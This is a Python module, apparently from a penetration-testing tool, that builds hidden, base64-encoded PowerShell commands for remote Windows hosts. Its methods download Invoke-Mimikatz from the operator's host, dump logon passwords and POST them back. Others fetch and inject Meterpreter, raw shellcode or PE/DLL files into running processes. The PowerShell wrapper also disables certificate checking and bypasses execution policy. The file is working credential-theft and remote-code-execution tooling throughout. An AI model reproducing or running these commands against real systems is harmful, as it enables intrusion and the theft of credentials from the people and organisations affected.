from logger import *
from base64 import b64encode
import logging
import settings

def ps_command(command):
    if settings.args.server == 'https':
        logging.info('Disabling certificate checking for the following PS command: ' + command)
        command = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + command

    if settings.args.force_ps32:
        logging.info('Wrapping the following PS command in a PS32 IEX cradle: ' + command)
        command = 'IEX "$Env:windir\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}"'.format(b64encode(command.encode('UTF-16LE')))

    base64_command = b64encode(command.encode('UTF-16LE'))

    logging.info('Full PS command to be encoded: ' + command)
    ps_command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64_command)

    return ps_command

class PowerSploit:

    """
        https://www.youtube.com/watch?v=nm6DO_7px1I
    """

    def __init__(self, server, localip):
        self.localip = localip
        self.protocol = server
        self.func_name = settings.args.obfs_func_name
        if server == 'smb':
            self.protocol = 'file'

    def mimikatz(self, command='privilege::debug sekurlsa::logonpasswords exit'):

        command = """
        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/tmp/Invoke-Mimikatz.ps1');
        $creds = Invoke-{func_name} -Command '{katz_command}';
        $request = [System.Net.WebRequest]::Create('{protocol}://{addr}/tmp');
        $request.Method = 'POST';
        $request.ContentType = 'application/x-www-form-urlencoded';
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
        $request.ContentLength = $bytes.Length;
        $requestStream = $request.GetRequestStream();
        $requestStream.Write( $bytes, 0, $bytes.Length );
        $requestStream.Close();
        $request.GetResponse();""".format(protocol=self.protocol, 
                                          func_name=self.func_name, 
                                          addr=self.localip,
                                          katz_command=command)

        return ps_command(command)

    def inject_meterpreter(self):
        command = """
        IEX (New-Object Net.WebClient).DownloadString('{0}://{1}/tmp/Invoke-Shellcode.ps1');
        Invoke-{2} -Force -Payload windows/meterpreter/{3} -Lhost {4} -Lport {5}""".format(self.protocol,
                                                                                           self.localip,
                                                                                           self.func_name,
                                                                                           settings.args.inject[4:], 
                                                                                           settings.args.met_options[0], 
                                                                                           settings.args.met_options[1])
        if settings.args.procid:
            command += " -ProcessID {}".format(settings.args.procid)

        command += ';'

        return ps_command(command)

    def inject_shellcode(self):
        command = """
        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/tmp/Invoke-Shellcode.ps1');
        $WebClient = New-Object System.Net.WebClient;
        [Byte[]]$bytes = $WebClient.DownloadData('{protocol}://{addr}/tmp2/{shellcode}');
        Invoke-{func_name} -Force -Shellcode $bytes""".format(protocol=self.protocol,
                                                              func_name=self.func_name,
                                                              addr=self.localip,
                                                              shellcode=settings.args.path.split('/')[-1])

        if settings.args.procid:
            command += " -ProcessID {}".format(settings.args.procid)

        command += ';'

        return ps_command(command)

    def inject_exe_dll(self):
        command = """
        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/tmp/Invoke-ReflectivePEInjection.ps1');
        Invoke-{func_name} -PEUrl {protocol}://{addr}/tmp2/{pefile}""".format(protocol=self.protocol,
                                                                              func_name=self.func_name,
                                                                              addr=self.localip,
                                                                              pefile=settings.args.path.split('/')[-1])

        if settings.args.procid:
            command += " -ProcID {}"

        if settings.args.inject == 'exe' and settings.args.exeargs:
            command += " -Exesettings.args \"{}\"".format(settings.args.exeargs)

        command += ';'

        return ps_command(command)